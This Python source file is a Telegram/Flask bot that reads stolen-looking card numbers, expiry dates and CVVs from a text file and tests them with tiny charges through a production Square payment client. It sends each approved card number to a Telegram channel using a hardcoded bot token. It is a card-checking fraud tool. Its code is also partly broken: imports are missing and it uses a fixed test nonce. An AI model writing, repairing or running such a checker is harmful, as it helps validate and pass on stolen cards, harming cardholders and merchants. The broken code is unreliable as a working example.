import asyncio
import telebot
import os
import json
import logging
from flask import Flask, request, jsonify, render_template, Response

# Configure logging to write to a file for displaying on the webpage
logging.basicConfig(filename='bot_activity.log', level=logging.INFO, format='%(asctime)s %(message)s')

# Load configuration from a JSON file
def load_config():
    try:
        with open('config.json') as f:
            return json.load(f)
    except Exception as e:
        logging.error(f"Failed to load configuration: {e}")
        return {}

config = load_config()

# Setup Square Client
square_client = Client(
    access_token=config['square']['access_token'],  # Access token from Square dashboard
    environment='production'  # Switch to 'production' for live transactions
)

# Initialize Flask app
app = Flask(__name__)

# Hardcoded Telegram Bot Token
API_TOKEN = "7785068082:AAEwD4mFUHLVLSeA5JrXZYnj8UKt52cFpHw"  # User's Telegram bot token
bot = telebot.TeleBot(API_TOKEN)

# Set the target Telegram channel (make sure to replace with your channel or group handle)
target_channel = os.getenv('TARGET_CHANNEL', '@cctalks700')  # Set in Render's environment variables

# Function to send confirmation to the target channel
def send_to_target_channel(transaction_info):
    try:
        bot.send_message(target_channel, f"Transaction Approved: {transaction_info}")
        logging.info(f"Sent to {target_channel}: Transaction Approved: {transaction_info}")
    except Exception as e:
        logging.error(f"Failed to send message: {e}")

# Function to handle the Square payment using the tokenized card nonce
async def process_payment(card_details):
    try:
        card_info = {
            "number": card_details[0],  # Card number
            "exp_month": int(card_details[1]),  # Expiration Month
            "exp_year": int(card_details[2]),   # Expiration Year
            "cvv": card_details[3]              # CVV
        }

        # Simulating the payment request (replace this part with actual nonce creation)
        body = {
            "source_id": "cnon:card-nonce-ok",  # For testing, replace with actual nonce
            "amount_money": {
                "amount": 1,  # Amount in cents, $0.01 for testing
                "currency": "USD"
            },
            "idempotency_key": os.urandom(16).hex()  # Ensure each transaction is unique
        }

        result = square_client.payments.create_payment(body)
        if result.is_success:
            logging.info(f"Payment successful for card: {card_info['number']}")
            return card_info  # Return the card info for approved cards
        else:
            logging.warning(f"Payment failed for card: {card_info['number']}, reason: {result.errors}")
            return None

    except Exception as e:
        logging.error(f"Error processing payment for card: {card_info['number']}, error: {e}")
        return None

# Function to scrape card details from cards.txt file and process payments
async def scrape_and_process_payments():
    try:
        async with aiofiles.open('cards.txt', 'r') as file:
            lines = await file.readlines()

        for line in lines:
            card_details = line.strip().split('|')  # Split card details by '|'

            # Process the payment asynchronously
            approved_card = await process_payment(card_details)
            if approved_card:
                send_to_target_channel(approved_card['number'])  # Send approved card number to Telegram

    except Exception as e:
        logging.error(f"Error in scraping and processing payments: {e}")

# Route to serve the bot activity logs as an HTML page
@app.route('/')
def index():
    return render_template('index.html')

# Route to stream the log file to the front-end
@app.route('/logs')
def stream_logs():
    def generate():
        with open('bot_activity.log') as f:
            while True:
                line = f.readline()
                if not line:
                    break
                yield line
    return Response(generate(), mimetype='text/plain')

# Start the scraping and processing
if __name__ == '__main__':
    logging.info("Bot is running...")
    asyncio.run(scrape_and_process_payments())  # Start the payment processing
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))  # Render uses the $PORT environment variable
